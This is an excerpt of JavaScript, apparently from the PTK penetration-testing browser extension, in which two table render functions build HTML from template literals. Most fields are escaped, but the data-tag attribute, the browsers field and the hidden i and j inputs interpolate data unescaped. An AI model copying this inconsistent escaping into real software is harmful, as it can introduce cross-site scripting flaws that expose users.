                        ...
                        render: function (data, type, row) {
                            ...
                            return `
                                <div class="ui message" style="padding-left:45px;">
                                    ...
                                    <div class="header">
                                    ${ptk_utils.escapeHtml(data.name)}
                                    </div>
                                    <p>${ptk_utils.escapeHtml(data.description)}</p>
                                    <div class="ui grid" >
                                        <div class="four wide column"><select class="tagSelect ui tiny dropdown" data-tag="${data.name}">${sel}</select></div>
                                        <div class="twelve wide column"><b class="codeValue" style="font-size:1.2em">${ptk_utils.escapeHtml(code)}</b></div>
                                    </div>
                        ...
                        render: function (data, type, row) {
                            return `
                                <div class="ui message" style="padding-left:45px">
                                    ...
                                    ${ptk_utils.escapeHtml(data.value)}
                                    </div>
                                    <p>${ptk_utils.escapeHtml(data.name)}</p>
                                    <p>${data.browsers}</p>
                                    <input type="hidden" name="i" value=" ${data.i}">
                                    <input type="hidden" name="j" value=" ${data.j}">
                                </div>
